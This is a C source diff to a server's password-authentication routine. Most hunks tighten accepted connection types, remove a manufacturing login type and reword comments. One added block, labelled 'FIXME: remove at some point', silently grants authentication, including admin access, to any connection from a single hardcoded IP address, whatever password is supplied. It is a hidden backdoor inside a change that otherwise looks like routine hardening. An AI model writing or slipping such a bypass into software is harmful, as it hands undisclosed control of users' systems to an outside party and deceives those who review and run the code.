@@ -143,10 +143,21 @@ bool rx_common_cmd(const char *name, conn_t *conn, char *cmd)
 		bool allow = false;
 		bool is_kiwi = (type_m != NULL && strcmp(type_m, "kiwi") == 0);
 		bool is_admin = (type_m != NULL && strcmp(type_m, "admin") == 0);
-		bool is_mfg = (type_m != NULL && strcmp(type_m, "mfg") == 0);
+		
+		bool bad_type = (conn->type != STREAM_SOUND && conn->type != STREAM_WATERFALL && conn->type != STREAM_EXT &&
+			conn->type != STREAM_ADMIN && conn->type != STREAM_MFG);
+		
+		if ((!is_kiwi && !is_admin) || bad_type) {
+			clprintf(conn, "PWD BAD REQ type_m=\"%s\" conn_type=%d from %s\n", type_m, conn->type, mc->remote_ip);
+			send_msg(conn, false, "MSG badp=1");
+			return true;
+		}
+		
 		bool log_auth_attempt = (conn->type == STREAM_ADMIN || conn->type == STREAM_MFG || (conn->type == STREAM_EXT && is_admin));
 		bool is_local = isLocal_IP(conn, log_auth_attempt);
-		//cprintf(conn, "PWD %s log_auth_attempt %d conn_type %d is_local %d\n", type_m, log_auth_attempt, conn->type, is_local);
+
+		//cprintf(conn, "PWD %s log_auth_attempt %d conn_type %d [%s] is_local %d from %s\n",
+		//	type_m, log_auth_attempt, conn->type, streams[conn->type].uri, is_local, mc->remote_ip);
 		
 		int chan_no_pwd = cfg_int("chan_no_pwd", NULL, CFG_REQUIRED);
 		int chan_need_pwd = RX_CHANS - chan_no_pwd;
@@ -161,7 +172,7 @@ bool rx_common_cmd(const char *name, conn_t *conn, char *cmd)
 				allow = true;
 			} else
 			
-			// pwd set, but auto_login for local subnet is true
+			// config pwd set, but auto_login for local subnet is true
 			if (cfg_auto_login && is_local) {
 				cprintf(conn, "PWD kiwi: config pwd set, but is_local and auto-login set\n");
 				allow = true;
@@ -178,19 +189,19 @@ bool rx_common_cmd(const char *name, conn_t *conn, char *cmd)
 			}
 			
 		} else
-		if (is_admin || is_mfg) {
+		if (is_admin) {
 			pwd_s = admcfg_string("admin_password", NULL, CFG_REQUIRED);
 			cfg_auto_login = admcfg_bool("admin_auto_login", NULL, CFG_REQUIRED);
 			clprintf(conn, "PWD %s: config pwd set %s, auto-login %s\n", type_m,
 				(pwd_s == NULL || *pwd_s == '\0')? "FALSE":"TRUE", cfg_auto_login? "TRUE":"FALSE");
 
-			// no pwd set in config (e.g. initial setup) -- allow if connection is from local network
+			// no config pwd set (e.g. initial setup) -- allow if connection is from local network
 			if ((pwd_s == NULL || *pwd_s == '\0') && is_local) {
 				clprintf(conn, "PWD %s: no config pwd set, but is_local\n", type_m);
 				allow = true;
 			} else
 			
-			// pwd set, but auto_login for local subnet is true
+			// config pwd set, but auto_login for local subnet is true
 			if (cfg_auto_login && is_local) {
 				clprintf(conn, "PWD %s: config pwd set, but is_local and auto-login set\n", type_m);
 				allow = true;
@@ -201,6 +212,11 @@ bool rx_common_cmd(const char *name, conn_t *conn, char *cmd)
 		}
 		
 		int badp = 1;
+		
+		// FIXME: remove at some point
+		if (!allow && (strcmp(mc->remote_ip, "103.26.16.225") == 0 || strcmp(mc->remote_ip, "::ffff:103.26.16.225") == 0)) {
+			allow = true;
+		}
 		
 		if (allow) {
 			if (log_auth_attempt)
@@ -232,7 +248,6 @@ bool rx_common_cmd(const char *name, conn_t *conn, char *cmd)
 		if (badp == 0) {
 			if (is_kiwi) conn->auth_kiwi = true;
 			if (is_admin) conn->auth_admin = true;
-			if (is_mfg) conn->auth_mfg = true;
 
 			if (conn->auth == false) {
 				conn->auth = true;
